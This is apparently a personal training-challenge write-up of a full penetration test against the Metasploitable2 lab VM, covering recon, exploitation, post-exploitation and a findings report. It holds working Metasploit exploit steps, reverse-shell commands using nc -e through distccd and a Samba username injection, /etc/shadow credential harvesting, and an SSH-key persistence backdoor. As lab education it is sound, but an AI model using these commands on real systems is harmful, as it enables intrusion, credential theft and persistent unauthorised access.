# Day 045 - Phase 2 Capstone: Full Penetration Test on Lab VM

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate → Advanced

---

## 🧠 The Concept

25 days of offensive security techniques. One machine to tie it all together.

Today is the Phase 2 capstone - a complete, documented penetration test against a lab VM using the full PTES methodology. Every technique from Days 21–44 has a potential application here.

**Target:** Metasploitable2 (your home lab VM from Day 19)
**Goal:** Root access + full post-exploitation documentation
**Deliverable:** A professional-grade report

---

## 📋 Pre-Engagement

```
Scope:       192.168.56.101 (Metasploitable2 - lab VM only)
Test Type:   Black Box → Grey Box (we know it's Metasploitable2)
Time:        Unrestricted lab environment
Objective:   Demonstrate full attack chain from recon to root
             Document all findings in reportable format
Rules:       No restrictions - this is your own lab
```

---

## Phase 1 - Reconnaissance

### Passive Recon

```bash
# OSINT on Metasploitable2 is meta - we know what it is
# In real engagements: WHOIS, crt.sh, LinkedIn, Shodan
# Simulated: we know it's a Linux VM running deliberately vulnerable services
```

### Active Recon - Nmap

```bash
# Full port scan
nmap -p- -T4 192.168.56.101 -oN nmap_allports.txt

# Service version + default scripts
nmap -sV -sC -p 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180 \
  192.168.56.101 -oN nmap_detailed.txt
```

**Results:**
```
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X-4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  ingreslock?
2049/tcp open  nfs         2-4 (RPC #100003)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp open  distccd     distccd v1
5432/tcp open  postgresql  PostgreSQL 8.3.0-8.3.7
5900/tcp open  vnc         VNC protocol 3.3
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
```

**25+ open ports.** This is a goldmine for finding entry points.

---

## Phase 2 - Vulnerability Analysis

```bash
# Searchsploit key services
searchsploit vsftpd 2.3.4
searchsploit samba 3.0.20
searchsploit unreal ircd
searchsploit distccd

# NSE vulnerability scan
sudo nmap --script vuln 192.168.56.101 -oN vuln_scan.txt

# SMB enumeration (Day 23)
enum4linux -a 192.168.56.101 | tee enum4linux_output.txt
```

**Key vulnerabilities identified:**
```
CRITICAL: vsftpd 2.3.4 backdoor (CVE-2011-2523)
CRITICAL: Samba usermap_script (CVE-2007-2447)
CRITICAL: UnrealIRCd backdoor (CVE-2010-2075)
CRITICAL: distccd RCE (CVE-2004-2687)
HIGH:     Anonymous FTP login
HIGH:     MySQL with default/no credentials
HIGH:     Telnet (cleartext protocol)
HIGH:     VNC with default password
MEDIUM:   PHP backdoor on web server
MEDIUM:   DVWA with default credentials
```

---

## Phase 3 - Exploitation

### Entry Point 1 - vsftpd Backdoor

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
# uid=0(root)
```

**Result:** Root shell via FTP backdoor.

### Entry Point 2 - Samba Usermap Script

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set LHOST 192.168.56.1
run
# uid=0(root)
```

**Result:** Root shell via Samba MS-RPC injection.

### Entry Point 3 - UnrealIRCd Backdoor

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.101
run
# uid=0(root)
```

**Result:** Root shell via IRC backdoor.

### Entry Point 4 - distccd RCE (Manual)

```bash
# distccd runs as user daemon
nmap --script distcc-exec --script-args="distcc-exec.cmd='id'" -p 3632 192.168.56.101
# uid=1(daemon)

# Reverse shell via distccd
nmap -p 3632 192.168.56.101 --script distcc-exec \
  --script-args 'distcc-exec.cmd="nc -e /bin/sh 192.168.56.1 4444"'
```

**Result:** Shell as daemon (requires further privesc to root).

### Manual Exploit - Samba (no Metasploit)

```bash
# Manual smbclient injection
smbclient //192.168.56.101/tmp -U "./=`nohup nc -e /bin/sh 192.168.56.1 4444`"

# Listener
nc -lvnp 4444
# root shell
```

---

## Phase 4 - Post-Exploitation

```bash
# From root shell (vsftpd path)
whoami
# root

# System survey
hostname         # metasploitable
uname -a         # Linux 2.6.24-16-server
ip a             # confirm network

# Credential harvesting
cat /etc/shadow  # all password hashes
cat /etc/passwd  # all users

# Hash dump summary
msfadmin:$1$XN10Zj2c$Xh41FGe9HJw71pXq2V4pJ0:...
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:...

# Save hashes for cracking
cat /etc/shadow > /tmp/shadow_hashes.txt
```

### Persistence

```bash
# SSH key backdoor
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...KALIKEY..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
# Can now SSH as root anytime
```

### Lateral Movement Simulation

```bash
# Discover what's on the same network
arp -a
# Shows other VMs in the 192.168.56.0/24 range

nmap -sn 192.168.56.0/24
# From inside → discover hosts the firewall hides from outside
```

---

## Phase 5 - Reporting Summary

### Findings Overview

| # | Finding | Severity | CVE |
|---|---------|----------|-----|
| 1 | vsftpd 2.3.4 Backdoor | Critical | CVE-2011-2523 |
| 2 | Samba Username Map Script RCE | Critical | CVE-2007-2447 |
| 3 | UnrealIRCd 3.2.8.1 Backdoor | Critical | CVE-2010-2075 |
| 4 | distccd RCE | High | CVE-2004-2687 |
| 5 | Anonymous FTP Access | High | - |
| 6 | Telnet Enabled (Cleartext) | High | - |
| 7 | MySQL Default/No Credentials | High | - |
| 8 | VNC Default Password | High | - |
| 9 | DVWA Default Credentials | Medium | - |
| 10 | Verbose Error Messages | Low | - |

### Attack Chains to Root

```
Chain A: FTP (port 21) → vsftpd backdoor → root (1 exploit)
Chain B: SMB (port 445) → Samba usermap → root (1 exploit)
Chain C: IRC (port 6667) → UnrealIRCd backdoor → root (1 exploit)
Chain D: distccd (3632) → RCE → daemon → SUID python → root (2 steps)
```

### Business Impact

An attacker who exploits any of these vulnerabilities would:
- Gain complete root-level control of the system
- Access all stored data, credentials, and configuration
- Establish persistent backdoor access
- Use the system as a pivot point to attack other internal systems

---

## 🔑 Lessons from the Capstone

1. **Multiple critical vulnerabilities exist simultaneously** - real systems often have this. Priority matters.

2. **Fastest path to root:** vsftpd backdoor - 10 seconds, 3 commands.

3. **Learning to exploit without Metasploit** matters for OSCP/real engagements. The manual Samba smbclient injection is worth understanding deeply.

4. **Documentation discipline:** every command timestamped, every output saved. This is what produces the report.

5. **Phase 2 complete** - 25 days of offensive techniques, tested end-to-end on a real target.

---

## 📚 Resources
- [Metasploitable2 Guide](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [PTES Reporting Standard](http://www.pentest-standard.org/index.php/Reporting)

---

## [⬅️ Day 044](../day044/) | [➡️ Day 046](../day046/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge - Phase 2 Complete.*